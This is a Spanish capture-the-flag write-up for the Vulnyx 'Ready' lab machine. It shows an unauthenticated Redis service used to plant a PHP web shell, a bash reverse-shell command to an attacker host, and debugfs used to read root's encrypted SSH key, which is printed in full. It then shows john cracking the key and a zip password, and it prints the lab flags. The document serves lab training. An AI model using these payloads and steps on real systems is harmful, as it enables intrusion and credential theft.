---
icon: flag
---

# Ready Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-11 03:14 EDT
Nmap scan report for 192.168.5.75
Host is up (0.00071s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 51:f9:f5:59:cd:45:4e:d1:2c:06:41:3b:a6:7a:91:19 (RSA)
|   256 5c:9f:60:b7:c5:50:fc:01:fa:37:7c:dc:16:54:87:3b (ECDSA)
|_  256 04:da:68:25:69:d6:2a:25:e2:5b:e2:99:36:36:d7:48 (ED25519)
80/tcp   open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: Apache2 Test Debian Default Page: It works
|_http-server-header: Apache/2.4.54 (Debian)
6379/tcp open  redis   Redis key-value store 6.0.16
8080/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Apache2 Test Debian Default Page: It works
MAC Address: 08:00:27:82:6D:B2 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.61 seconds
```

Veremos varios puertos interesantes, pero entre ellos dos los cuales suelen alojas paginas web que serian el puerto `80` y el `8080` vamos a ver que contiene cada uno de ellos.

Si entramos dentro del puerto `80` veremos una pagina de `apache` normal por defecto, pero si entramos en la del `8080` veremos exactamente lo mismo, no veremos nada interesante fuera de lo normal, por lo que vamos a realizar un poco de `fuzzing`.

Si lanzamos un `gobuster` no veremos gran cosa, no nos va a detectar mas `subdirectorios` web ni nada parecido, por lo que solo nos queda el puerto `6379` vamos a ver que hace y como funciona.

## Redis (6379)

#### Qué es Redis

* Es una base de datos **NoSQL** que guarda datos en memoria (y opcionalmente los persiste en disco).
* No tiene “tablas” como MySQL, sino **claves** (`keys`) y **valores** (`values`), que pueden ser strings, listas, hashes, sets, etc.
* Se administra normalmente vía CLI (`redis-cli`) o con librerías en varios lenguajes.

Por lo que vemos podemos acceder al mismo de forma anonima, vamos a probar si pudieramos conectarnos de forma anonima.

```shell
redis-cli -h <IP_VICTIM>
```

Info:

```
192.168.5.75:6379> PING
PONG
```

Veremos que nos hemos conectado de forma exitosa, realizamos un `PING` para ver que funciona y efectivamente estamos dentro, dentro del mismo podremos modificar o subir archivos, lo que se nos ocurre que a lo mejor podremos subir una `webshell` a la ruta de los archivos web para realizarnos una `reverse shell` desde la web.

## Escalate user ben

```shell
CONFIG SET dir /var/www/html/
CONFIG SET dbfilename shell.php
SET x "<?php system(\$_GET['cmd']); ?>"
SAVE
```

Una vez echo esto, vamos a probar metiendonos en la pagina web de esta forma:

```
URL = http://<IP>:8080/shell.php?cmd=id
```

Info:

```
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
```

Vemos que esta funcionando de forma correcta, por lo que vamos a realizar una `reverse shell`.

```
URL = http://<IP>:8080/shell.php?cmd=/bin/bash -c "/bin/bash -i >%26 /dev/tcp/<IP_ATTACKER>/<PORT> 0>%261"
```

Ahora antes de enviarlo nos pondremos a la escucha:

```shell
nc -lvnp <PORT>
```

Si enviamos lo anterior y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.75] 46598
bash: cannot set terminal process group (461): Inappropriate ioctl for device
bash: no job control in this shell
ben@ready:/var/www/html$ whoami
whoami
ben
```

Vemos que hemos accedido de forma correcta con el usuario `ben` por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Ahora que ya tenemos una shell mas limpia vamos a leer la `flag` del usuario.

> user.txt

```
e5d3f520423fdef77195ac688ecc27cb
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ben on ready:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User ben may run the following commands on ready:
    (peter) NOPASSWD: /usr/bin/bash
```

Vemos que podemos ejecutar el binario `bash` como el usuario `peter`, simplemente con este comando podremos ser dicho usuario.

```shell
sudo -u peter bash
```

Info:

```
peter@ready:/home/ben$ whoami
peter
```

Pero no nos interesa nada este usuario, ya que no puede hacer nada, volviendo al usuario `ben` si hacemos `id` veremos el siguiente grupo:

```
uid=1000(ben) gid=1000(ben) groups=1000(ben),6(disk)
```

Vemos que pertenecemos al grupo `disk` podremos usar un comando dentro de `debugfs`, **para leer el archivo directamente desde el sistema de archivos ext**, sin pasar por la capa del sistema operativo o permisos tradicionales.

Con esto lo que podemos hacer es poder leer cualquier archivo, vamos a probar si `root` tuviera alguna clave privada de esta forma:

```shell
df -h
```

Info:

```
Filesystem      Size  Used Avail Use% Mounted on
/dev/sda1       6.9G  1.5G  5.1G  22% /
udev            473M     0  473M   0% /dev
tmpfs           489M     0  489M   0% /dev/shm
tmpfs            98M  492K   98M   1% /run
tmpfs           5.0M     0  5.0M   0% /run/lock
```

Ya sabemos que donde tenemos que entrar es en `/dev/sda1`, por lo que haremos esto:

```shell
debugfs /dev/sda1
```

Info:

```
debugfs 1.46.2 (28-Feb-2021)
debugfs:
```

Dentro del mismo vamos a ejecutar el siguiente comando simple:

```shell
cat /root/.ssh/id_rsa
```

Info:

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,02E266E7A66462FE

tTN5G66QaZHsjOSYG8pFEQqUJUC4lw+WzHs3hbml1+zuLPmnDvUapYFB/4IgQNG2
jp1tebAwENVz/CdS3paB60NB9uosYXHa60Sbi7a31Ej6QqH10UnN/NROSEhqZkt+
dUcQspoDJIvHyvdhm4lIVizfvw1i9epxY+aB9W7vscpN1HAq37WdOn62nnEccLRs
wShZgOeOLTUo5j+C0oQZDi11ZJxEFiwwCFkOqZ+ZEQgshQqgG8PjMvedwuQcFjpN
wgFyQl0ZzGTzaj1iZntc/7G1/9WqXyk3IkpICucALCaSlCZ3Oh0kJd12W27vTKdO
kBpXNU8cgjc+jbIKveFZe6+ZuMwr3Lb9p+f+m7ktcTk/AFxSObuFnHBZN52VE/F4
lVK8vR7Om8qg34REgbvkmrBttg7x4AzUsTZ1WPPJqu3VS0SGVyq8vkpA2ngHmMBC
h3Ca0Xjua55GzCFBGePrQmqOd8jKZ0W6HBfCQyGB/dGg57mKNQy1OSIR4XtFYDYN
wNGTgr4KPebWf1CYRg2nleu3DD3sezutvoVMLJdzoeaLrCPX0pdfEhBase7n72Gy
Q6zqrk07p5GQeuL3tfhBsbHqgK899IMPr2VZPwvaoibDF66UJ1unfEXiPzTTHDo9
5MTR1GK7HYnmtypx3OpCDJMFGwaJgx+o944cxX9DQ63pgwx1R34RoQRfIgqUUrsG
NhEkLvrYFMnlK/dSmouuNFvd868zBlMByQyVYoepyHGhsGDuAP4Mhx7L1Gbj4dRS
dMgfgLN0lM0G+P9QvmmX7TuH1MU1IIfZZw9dCfdUqVVKyegA2RQ7fZG9D8o3l1J0
bIj0VJE7ykqqZEndzgBGRw3bEu3/OKpJM2UFqr/pPlu1w1bVIzHrTPNI5nk6dm77
n/TqwSgU2EQDWK88Z8TORZvuoNA3FelyzxCfRC2HLv0+QrVbyY7dLf3oLH0Zq+gK
1OYVrTKbe4pu0J2R7jZw20pLWeEZPuSE3RmVwcSsVzwb6dBk5rMkwCE5gG1qNh1U
koCqtHzXveisx5I7KrvBj5RTaK/aPX/v8BS/oh8AmiQr2Pqq9K+aQScP2XYh691x
yfVoFGJrZMcG5VD3QxrgWamgcHhug2LotpRbxjc777uK/muI9rUSQLYC06H2Cdf/
kRUH9Ohf3ZrVXpcCMhuCBbOxYBr+TAGjwJIBAYuFMBqhZ4gyaZhxJMCBhQOJHy6c
xR2cUdOAUh9lY40/o0Pwf+5GWiX2u5KmzcZ9iLdJ4NtgYiYMjGMe+0G37PdCXJvG
D+VsowoqCou916TMZUKpYSkzj8q3GLSib6CumVzKDesMLaYiZTOd1ShBqTlYjorp
Dlo5vrgUFk17OS8n0gtQuavBvN+2aM6gMOgiJrXfeLjzPGoY2ypHyNlbp/JI0/Y+
DfE+2kNqriAlvZps1mllIKITk1wNPQ3PVuBW9DkvrSUW7Ye+oMK3WoiQkY4qyu+2
pN0okmXmT5ygTq9KBQUEtjU8RnY27y34nYwCQus0HCA+FfRoxDbJYl0sN2g/Mzjq
PWVlSZLxzcya8sxPBA8gto3H5BxFnTxRXbCBTjTL09imi3QMl9K1emUlG8rSpBsI
-----END RSA PRIVATE KEY-----
```

Vemos que lo hemos conseguido, pero tambien veremos que esta encriptado la clave, por lo que vamos a ver si conseguimos decodificarla con estos comandos desde nuestro `kali`.

> id\_rsa

```
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: DES-EDE3-CBC,02E266E7A66462FE

tTN5G66QaZHsjOSYG8pFEQqUJUC4lw+WzHs3hbml1+zuLPmnDvUapYFB/4IgQNG2
jp1tebAwENVz/CdS3paB60NB9uosYXHa60Sbi7a31Ej6QqH10UnN/NROSEhqZkt+
dUcQspoDJIvHyvdhm4lIVizfvw1i9epxY+aB9W7vscpN1HAq37WdOn62nnEccLRs
wShZgOeOLTUo5j+C0oQZDi11ZJxEFiwwCFkOqZ+ZEQgshQqgG8PjMvedwuQcFjpN
wgFyQl0ZzGTzaj1iZntc/7G1/9WqXyk3IkpICucALCaSlCZ3Oh0kJd12W27vTKdO
kBpXNU8cgjc+jbIKveFZe6+ZuMwr3Lb9p+f+m7ktcTk/AFxSObuFnHBZN52VE/F4
lVK8vR7Om8qg34REgbvkmrBttg7x4AzUsTZ1WPPJqu3VS0SGVyq8vkpA2ngHmMBC
h3Ca0Xjua55GzCFBGePrQmqOd8jKZ0W6HBfCQyGB/dGg57mKNQy1OSIR4XtFYDYN
wNGTgr4KPebWf1CYRg2nleu3DD3sezutvoVMLJdzoeaLrCPX0pdfEhBase7n72Gy
Q6zqrk07p5GQeuL3tfhBsbHqgK899IMPr2VZPwvaoibDF66UJ1unfEXiPzTTHDo9
5MTR1GK7HYnmtypx3OpCDJMFGwaJgx+o944cxX9DQ63pgwx1R34RoQRfIgqUUrsG
NhEkLvrYFMnlK/dSmouuNFvd868zBlMByQyVYoepyHGhsGDuAP4Mhx7L1Gbj4dRS
dMgfgLN0lM0G+P9QvmmX7TuH1MU1IIfZZw9dCfdUqVVKyegA2RQ7fZG9D8o3l1J0
bIj0VJE7ykqqZEndzgBGRw3bEu3/OKpJM2UFqr/pPlu1w1bVIzHrTPNI5nk6dm77
n/TqwSgU2EQDWK88Z8TORZvuoNA3FelyzxCfRC2HLv0+QrVbyY7dLf3oLH0Zq+gK
1OYVrTKbe4pu0J2R7jZw20pLWeEZPuSE3RmVwcSsVzwb6dBk5rMkwCE5gG1qNh1U
koCqtHzXveisx5I7KrvBj5RTaK/aPX/v8BS/oh8AmiQr2Pqq9K+aQScP2XYh691x
yfVoFGJrZMcG5VD3QxrgWamgcHhug2LotpRbxjc777uK/muI9rUSQLYC06H2Cdf/
kRUH9Ohf3ZrVXpcCMhuCBbOxYBr+TAGjwJIBAYuFMBqhZ4gyaZhxJMCBhQOJHy6c
xR2cUdOAUh9lY40/o0Pwf+5GWiX2u5KmzcZ9iLdJ4NtgYiYMjGMe+0G37PdCXJvG
D+VsowoqCou916TMZUKpYSkzj8q3GLSib6CumVzKDesMLaYiZTOd1ShBqTlYjorp
Dlo5vrgUFk17OS8n0gtQuavBvN+2aM6gMOgiJrXfeLjzPGoY2ypHyNlbp/JI0/Y+
DfE+2kNqriAlvZps1mllIKITk1wNPQ3PVuBW9DkvrSUW7Ye+oMK3WoiQkY4qyu+2
pN0okmXmT5ygTq9KBQUEtjU8RnY27y34nYwCQus0HCA+FfRoxDbJYl0sN2g/Mzjq
PWVlSZLxzcya8sxPBA8gto3H5BxFnTxRXbCBTjTL09imi3QMl9K1emUlG8rSpBsI
-----END RSA PRIVATE KEY-----
```

```shell
ssh2john id_rsa > hash.ssh | john --wordlist=<WORDLIST> hash.ssh
```

Info:

```
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
shelly           (id_rsa)     
1g 0:00:00:00 DONE (2025-08-11 03:49) 20.00g/s 19840p/s 19840c/s 19840C/s marie1..babyface
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que hemos conseguido la contraseña del `id_rsa` por lo que vamos a utilizarla conectandonos con el usuario `root` mediante `SSH`.

```shell
chmod 600 id_rsa
```

```shell
ssh -i id_rsa root@<IP>
```

Metemos como contraseña `shelly`...

Info:

```
Enter passphrase for key 'id_rsa': 
Linux ready 5.10.0-16-amd64 #1 SMP Debian 5.10.127-1 (2022-06-30) x86_64
Last login: Wed Jul 12 18:22:32 2023
root@ready:~# whoami
root
```

Con esto veremos que estaremos dentro por lo que leeremos la `flag` del usuario `root`.

Veremos que la propia `flag` esta comprimida, por lo que vamos a pasarnosla a la maquina `kali` mediante un servidor de `python3` (`python3 -m http.server`).

Una vez que este en nuestro `host` si intentamos descomprimirlo nos pedira una contraseña, por lo que vamos a `crackearla` de esta forma:

```shell
zip2john root.zip > hash.zip | john --wordlist=<WORDLIST> hash.zip
```

Info:

```
ver 2.0 efh 5455 efh 7875 root.zip/root.txt PKZIP Encr: TS_chk, cmplen=43, decmplen=32, crc=68F3F801 ts=91CA cs=91ca type=8
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
already          (root.zip/root.txt)     
1g 0:00:00:00 DONE (2025-08-11 03:53) 33.33g/s 819200p/s 819200c/s 819200C/s christal..280789
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Veremos que lo hemos conseguido, por lo que vamos a descomprimirlo de una vez con la contraseña obtenida.

```shell
unzip root.zip
```

Metemos como contraseña `already` y veremos que lo descomprimimos de forma correcta.

> root.txt

```
cf537b04dd79e859816334b89e85c435
```
